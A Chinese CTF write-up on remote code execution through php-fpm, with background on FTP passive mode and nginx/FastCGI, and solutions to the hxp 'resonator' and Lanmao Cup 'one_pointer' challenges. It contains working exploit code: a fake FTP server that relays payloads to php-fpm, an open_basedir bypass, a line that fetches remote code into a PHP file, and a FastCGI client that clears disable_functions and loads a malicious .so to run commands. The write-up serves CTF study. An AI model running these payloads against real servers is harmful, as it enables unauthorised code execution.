> 原文链接: https://www.anquanke.com//post/id/240022 


# 重新学习FTP与php-FPM的RCE


                                阅读量   
                                **139404**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01e231b2ac31f5a0bf.png)](https://p5.ssl.qhimg.com/t01e231b2ac31f5a0bf.png)



前几天看了蓝帽杯2021的web题目讲真，一个游戏一个rce，打得我头皮发麻，最后是一个绕过disable_function今天也来这里记载一下，写得不好，还得大佬们批评指正。

## 0x01 预备知识

### <a class="reference-link" name="(%E4%B8%80)%20FTP%E7%9A%84%E4%B8%BB%E5%8A%A8%E4%B8%8E%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F"></a>(一) FTP的主动与被动模式

参考资料：

ftp

[https://southrivertech.com/wp-content/uploads/FTP_Explained1.pdf](https://southrivertech.com/wp-content/uploads/FTP_Explained1.pdf)

[https://slacksite.com/other/ftp.html](https://slacksite.com/other/ftp.html)

[https://zhuanlan.zhihu.com/p/37963548](https://zhuanlan.zhihu.com/p/37963548)

ftp rfc 文档：

[http://www.faqs.org/rfcs/rfc959.html](http://www.faqs.org/rfcs/rfc959.html)

ftp 命令字和响应码：

[https://blog.csdn.net/qq981378640/article/details/51254177](https://blog.csdn.net/qq981378640/article/details/51254177)

#### <a class="reference-link" name="1.FTP%E7%AE%80%E4%BB%8B%EF%BC%9A"></a>1.FTP简介：

文件传输协议，简称FTP是用于在网络进行文件传输的协议，客户和服务器模式。FTP只通过TCP连接,没有用于FTP的UDP组件.FTP不同于其他服务的是它使用了两个端口, 一个数据端口和一个命令端口(或称为控制端口)。通常`21端口是命令端口`，`20端口是数据端口`。

但是混入主被动模式之后，这些端口可能会有一些变化。

#### <a class="reference-link" name="2.%20%E4%B8%BB%E5%8A%A8%E6%A8%A1%E5%BC%8F"></a>2. 主动模式

（1） 客户端打开一个随机的端口（端口号大于1024，在这里，我们称它为x），同时一个FTP进程连接至服务器的21号命令端口。此时，该tcp连接的来源地端口为客户端指定的随机端口x，目的地端口（远程端口）为服务器上的21号端口。<br>
（2） 客户端开始监听端口（x+1），同时向服务器发送一个端口命令（通过服务器的21号命令端口），此命令告诉服务器客户端正在监听的端口号并且已准备好从此端口接收数据。这个端口就是我们所知的数据端口。<br>
（3）服务器打开20号源端口并且创建和客户端数据端口的连接。此时，来源地的端口为20，远程数据(目的地)端口为（x+1）。<br>
（4）客户端通过本地的数据端口创建一个和服务器20号端口的连接，然后向服务器发送一个应答，告诉服务器它已经创建好了一个连接

[![](https://p1.ssl.qhimg.com/t01d790cfb0dfe72432.png)](https://p1.ssl.qhimg.com/t01d790cfb0dfe72432.png)

大概形式长这个样子（第一次使用画图工具，有点丑）

主动模式中，其实客户端和服务器断并没有建立一条实际的数据链路，而只是，客户端告诉服务器我监听端口，然后服务器来链接这个，这其实是一个从外部建立进来的连接，所以防火墙就会杀他。

所以这在一定程度其实是不会被经常使用的。

#### <a class="reference-link" name="3.%20%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F"></a>3. 被动模式
1. 客户端向服务器的21端口 发送PASV指令，请求被动链接，该tcp连接的来源地端口为客户端指定的随机端口x，目的地端口（远程端口）为服务器上的21号端口。
1. 客户端开始监听本地的x+1端口，服务端会开启一个端口来和客户端（Y）进行通信，并告知
1. 客户端初始化一个从自己的数据端口到服务器端指定的数据端口的数据连接
1. 服务端通过本地的数据端口创建一个和客户端的连接，然后向客户端发送一个应答，告诉客户端它已经创建好了一个连接。
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t013c3dd7d8f547c1b4.png)

下面是一个wireshark 中经典的被动模式流量图

[![](https://p1.ssl.qhimg.com/t0168118ce36f929bc8.png)](https://p1.ssl.qhimg.com/t0168118ce36f929bc8.png)

```
被动模式返回的端口号是 192.168.1.5:19*256+14
```

记住这个神奇的计算公式

### <a class="reference-link" name="(%E4%BA%8C)%20php-fpm%E6%94%BB%E5%87%BB"></a>(二) php-fpm攻击

参考链接：[https://xz.aliyun.com/t/5598](https://xz.aliyun.com/t/5598)

#### <a class="reference-link" name="1.%20php-fpm%E7%AE%80%E4%BB%8B"></a>1. php-fpm简介

总的意思就不多说了

```
www.example.com
        |
        |
      Nginx
        |
        |
路由到www.example.com/index.php
        |
        |
加载nginx的fast-cgi模块
        |
        |
fast-cgi监听127.0.0.1:9000地址
        |
        |
www.example.com/index.php请求到达127.0.0.1:9000
        |
        |
php-fpm 监听127.0.0.1:9000
        |
        |
php-fpm 接收到请求，启用worker进程处理请求
        |
        |
php-fpm 处理完请求，返回给nginx
        |
        |
nginx将结果通过http返回给浏览器
```

给大家看一下一个正常的http请求是如何被解析的（这个要是不会就直接gg了，所以我先死为敬）

#### <a class="reference-link" name="2.%20%E4%B8%A4%E7%A7%8D%E4%BA%A4%E6%B5%81%E6%96%B9%E5%BC%8F"></a>2. 两种交流方式

```
1.tcp方式的话就是直接fpm直接通过监听本地9000端口来进行通信
2.unix socket其实严格意义上应该叫unix domain socket，它是*nix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。
Unix domain socket 或者 IPC socket是一种终端，可以使同一台操作系统上的两个或多个进程进行数据通信。与管道相比，Unix domain sockets 既可以使用字节流和数据队列，而管道通信则只能通过字节流。Unix domain sockets的接口和Internet socket很像，但它不使用网络底层协议来通信。Unix domain socket 的功能是POSIX操作系统里的一种组件。Unix domain sockets 使用系统文件的地址来作为自己的身份。它可以被系统进程引用。所以两个进程可以同时打开一个Unix domain sockets来进行通信。不过这种通信方式是发生在系统内核里而不会在网络里传播
```

所以在做的时候要注意好是哪一种方式，具体内部的实现就不多说了。其实只要大概明白这两种方式之间利用不同就行了。

#### <a class="reference-link" name="3%20%E6%BC%8F%E6%B4%9E%E9%83%A8%E5%88%86"></a>3 漏洞部分

既然要攻击，那就必须得有漏洞点吧，漏洞出现在哪里呢？很明显就在于，php-fpm在监听端口或者使用unix进行通信的时候没有验证，这些流量是否是合法。

如果我能够控制主机内的机器向绑定的端口发送符合他们呢规范的流量就可以执行命令。

[![](https://p0.ssl.qhimg.com/t012954547fb7d2c94d.png)](https://p0.ssl.qhimg.com/t012954547fb7d2c94d.png)

### <a class="reference-link" name="(%E4%B8%89)%20nginx%20%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A7%A3%E9%87%8A"></a>(三) nginx 配置文件解释

```
server `{`

​ listen 80 default_server; # 监听80端口，接收http请求

​ servername ; # 网站地址

​ root /var/www/html; # 网站根目录

​ location /`{`

​ #First attempt to serve request as file, then
​ # as directory, then fall back to displaying a 404.

​ try_files \$uri \$uri/ =404; # 文件不存在就返回404状态

`}`

# 下面是重点

location ~ .php$ `{`
include snippets/fastcgi-php.conf; #加载nginx的fastcgi模块
# With php7.0-cgi alone:

​ fastcgi_pass 127.0.0.1:9000; # 监听nginx fastcgi进程监听的ip地址和端口
​ # With php7.0-fpm:
​ # fastcgi_pass unix:/run/php/php7.0-fpm.sock;
​ `}`
```

[![](https://p5.ssl.qhimg.com/t01ea118b16fa4dd7f4.png)](https://p5.ssl.qhimg.com/t01ea118b16fa4dd7f4.png)

初始化

```
1. sudo apt update
2. sudo apt install -y nginx
3. sudo apt install -y software-properties-common
4. sudo add-apt-repository -y ppa:ondrej/php
5. sudo apt update
6. sudo apt install -y php7.3-fpm
```

`/etc/nginx/sites-enabled/default`

[![](https://p0.ssl.qhimg.com/t01002c2e1c1183d459.png)](https://p0.ssl.qhimg.com/t01002c2e1c1183d459.png)

`/etc/php/7.3/fpm/pool.d/www.conf`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0196fa8287929bd306.png)

```
/etc/init.d/php7.3-fpm restart
service nginx reload
```

[![](https://p3.ssl.qhimg.com/t016bdacd1db4adcac0.png)](https://p3.ssl.qhimg.com/t016bdacd1db4adcac0.png)



## 0x02 解题

### <a class="reference-link" name="(%E4%B8%80%EF%BC%89%20hxp%E7%9A%84resonator%E5%B0%8F%E8%A7%A3%E6%9E%90"></a>(一） hxp的resonator小解析

首先贴源码

```
&lt;?php
$file = $_GET['file'] ?? '/tmp/file';
$data = $_GET['data'] ?? ':)';
file_put_contents($file, $data);
echo file_get_contents($file);

```

www.conf

```
listen = 127.0.0.1:9000
```

现在我们可以在tmp目录下任意写文件，配合PHP-FPM的漏洞，我们就可以解这个题了。

如果可以将任意二进制数据包发送到 php-fpm 服务，则可以执行代码。 此技术通常与 `gopher://` 协议结合使用（ssrf），该协议受 curl 支持，**但不受 php 支持**。

我们先来看`php`支持的协议[https://www.php.net/manual/zh/wrappers.php#wrappers](https://www.php.net/manual/zh/wrappers.php#wrappers)

```
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址 攻击内网
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档 phar.readonly = 0
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
-pass 以上四个都需要安装 PECL 扩展
```

现在其实就只剩下了ftp协议了。使用上面的ftp被动模式这样就可以转发到我们想要的端口了。

[![](https://p5.ssl.qhimg.com/t01486db89df8019524.png)](https://p5.ssl.qhimg.com/t01486db89df8019524.png)

贴上我们的fake_ftp

```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 9999))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

注意上面的`9000`端口需要自己测试。因为地方可能不一样

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0148c9cf148bbc3cc4.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ca9ccebab2d8652f.png)

[![](https://p0.ssl.qhimg.com/t016752df56a49663f4.png)](https://p0.ssl.qhimg.com/t016752df56a49663f4.png)

这个题就不难解决了，纯粹的一个题解。

### <a class="reference-link" name="(%E4%BA%8C)%20%E8%93%9D%E5%B8%BD%E6%9D%AF%E7%9A%84one_pointer"></a>(二) 蓝帽杯的one_pointer

第一层的溢出就不多说了。下面给两个绕过open_basedir

```
&lt;?php
chdir("sandbox/660bef445e619cf44695fec04f93e4f7ff60e252");
mkdir('decadefirst');
chdir('decadefirst');
ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');
chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');
readfile("/flag");
var_dump(file_get_contents($_GET[a]));
```

```
file_put_contents("a.php",file_get_contents(ip))
```

[![](https://p0.ssl.qhimg.com/t014c64e47ff7ec2148.png)](https://p0.ssl.qhimg.com/t014c64e47ff7ec2148.png)

[![](https://p0.ssl.qhimg.com/t010a840f582b6db977.png)](https://p0.ssl.qhimg.com/t010a840f582b6db977.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01ff6273f5ecd70c02.png)

大概就是这么一个流程。下面开始打了。

下面贴上ha牛的脚本

```
&lt;?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
 * @version     1.0
 */
class FCGIClient
`{`
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    `{`
        $this-&gt;_host = $host;
        $this-&gt;_port = $port;
    `}`
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    `{`
        $this-&gt;_keepAlive = (boolean)$b;
        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) `{`
            fclose($this-&gt;_sock);
        `}`
    `}`
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    `{`
        return $this-&gt;_keepAlive;
    `}`
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    `{`
        if (!$this-&gt;_sock) `{`
            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);
            if (!$this-&gt;_sock) `{`
                throw new Exception('Unable to connect to FastCGI application');
            `}`
        `}`
    `}`
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    `{`
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
            . chr($requestId &amp; 0xFF)        /* requestIdB0 */
            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
            . chr($clen &amp; 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    `}`
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    `{`
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen &lt; 128) `{`
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        `}` else `{`
            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
        `}`
        if ($vlen &lt; 128) `{`
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        `}` else `{`
            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
        `}`
        /* nameData &amp; valueData */
        return $nvpair . $name . $value;
    `}`
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    `{`
        $array = array();
        if ($length === null) `{`
            $length = strlen($data);
        `}`
        $p = 0;
        while ($p != $length) `{`
            $nlen = ord($data`{`$p++`}`);
            if ($nlen &gt;= 128) `{`
                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
                $nlen |= (ord($data`{`$p++`}`) &lt;&lt; 16);
                $nlen |= (ord($data`{`$p++`}`) &lt;&lt; 8);
                $nlen |= (ord($data`{`$p++`}`));
            `}`
            $vlen = ord($data`{`$p++`}`);
            if ($vlen &gt;= 128) `{`
                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
                $vlen |= (ord($data`{`$p++`}`) &lt;&lt; 16);
                $vlen |= (ord($data`{`$p++`}`) &lt;&lt; 8);
                $vlen |= (ord($data`{`$p++`}`));
            `}`
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        `}`
        return $array;
    `}`
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    `{`
        $ret = array();
        $ret['version']       = ord($data`{`0`}`);
        $ret['type']          = ord($data`{`1`}`);
        $ret['requestId']     = (ord($data`{`2`}`) &lt;&lt; 8) + ord($data`{`3`}`);
        $ret['contentLength'] = (ord($data`{`4`}`) &lt;&lt; 8) + ord($data`{`5`}`);
        $ret['paddingLength'] = ord($data`{`6`}`);
        $ret['reserved']      = ord($data`{`7`}`);
        return $ret;
    `}`
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    `{`
        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) `{`
            $resp = $this-&gt;decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) `{`
                $len  = $resp['contentLength'];
                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) `{`
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                `}`
            `}`
            if ($resp['paddingLength']) `{`
                $buf=fread($this-&gt;_sock, $resp['paddingLength']);
            `}`
            return $resp;
        `}` else `{`
            return false;
        `}`
    `}`
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    `{`
        $this-&gt;connect();
        $request = '';
        foreach ($requestedInfo as $info) `{`
            $request .= $this-&gt;buildNvpair($info, '');
        `}`
        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this-&gt;readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) `{`
            return $this-&gt;readNvpair($resp['content'], $resp['length']);
        `}` else `{`
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        `}`
    `}`
    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    `{`
        $response = '';
//        $this-&gt;connect();
        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key =&gt; $value) `{`
            $paramsRequest .= $this-&gt;buildNvpair($key, $value);
        `}`
        if ($paramsRequest) `{`
            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
        `}`
        $request .= $this-&gt;buildPacket(self::PARAMS, '');
        if ($stdin) `{`
            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);
        `}`
        $request .= $this-&gt;buildPacket(self::STDIN, '');
        echo('?file=ftp://ip:9999&amp;data='.urlencode($request));
//        fwrite($this-&gt;_sock, $request);
//        do `{`
//            $resp = $this-&gt;readPacket();
//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) `{`
//                $response .= $resp['content'];
//            `}`
//        `}` while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);
//        var_dump($resp);
//        if (!is_array($resp)) `{`
//            throw new Exception('Bad request');
//        `}`
//        switch (ord($resp['content']`{`4`}`)) `{`
//            case self::CANT_MPX_CONN:
//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
//                break;
//            case self::OVERLOADED:
//                throw new Exception('New request rejected; too busy [OVERLOADED]');
//                break;
//            case self::UNKNOWN_ROLE:
//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
//                break;
//            case self::REQUEST_COMPLETE:
//                return $response;
//        `}`
    `}`
`}`
?&gt;
&lt;?php
// real exploit start here
//if (!isset($_REQUEST['cmd'])) `{`
//    die("Check your input\n");
//`}`
//if (!isset($_REQUEST['filepath'])) `{`
//    $filepath = __FILE__;
//`}`else`{`
//    $filepath = $_REQUEST['filepath'];
//`}`

$filepath = "/var/www/html/add_api.php";
$req = '/'.basename($filepath);
$uri = $req .'?'.'command=whoami';
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "&lt;?php system(\$_REQUEST['command']); phpinfo(); ?&gt;"; // php payload -- Doesnt do anything
$php_value = "unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = ";
$params = array(
    'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
    'REQUEST_METHOD'    =&gt; 'POST',
    'SCRIPT_FILENAME'   =&gt; $filepath,
    'SCRIPT_NAME'       =&gt; $req,
    'QUERY_STRING'      =&gt; 'command=whoami',
    'REQUEST_URI'       =&gt; $uri,
    'DOCUMENT_URI'      =&gt; $req,
#'DOCUMENT_ROOT'     =&gt; '/',
    'PHP_VALUE'         =&gt; $php_value,
    'SERVER_SOFTWARE'   =&gt; '80sec/wofeiwo',
    'REMOTE_ADDR'       =&gt; '127.0.0.1',
    'REMOTE_PORT'       =&gt; '9001',
    'SERVER_ADDR'       =&gt; '127.0.0.1',
    'SERVER_PORT'       =&gt; '80',
    'SERVER_NAME'       =&gt; 'localhost',
    'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',
    'CONTENT_LENGTH'    =&gt; strlen($code)
);
// print_r($_REQUEST);
```

```
// print_r($params);
//echo "Call: $uri\n\n";
echo $client-&gt;request($params, $code)."\n";
?&gt;
```

这是普通的方式，但是在这里我们会发现这个方法他不行了，不难正常了打完。但是，我们在读取`php.ini`的时候发现了一个so文件,我们就可以通过加载恶意so文件来绕过。

看一下上面的脚本也就知道怎么操作了。

下面还有个suid提权不说了，收工了，困。

[![](https://p3.ssl.qhimg.com/t0129455fe02e2985b5.png)](https://p3.ssl.qhimg.com/t0129455fe02e2985b5.png)



## 0x03 总结与参考链接

> [https://www.anquanke.com/post/id/233454](https://www.anquanke.com/post/id/233454)
[https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-6](https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-6)
[https://xz.aliyun.com/t/5598](https://xz.aliyun.com/t/5598)
[https://www.anquanke.com/post/id/186186](https://www.anquanke.com/post/id/186186)
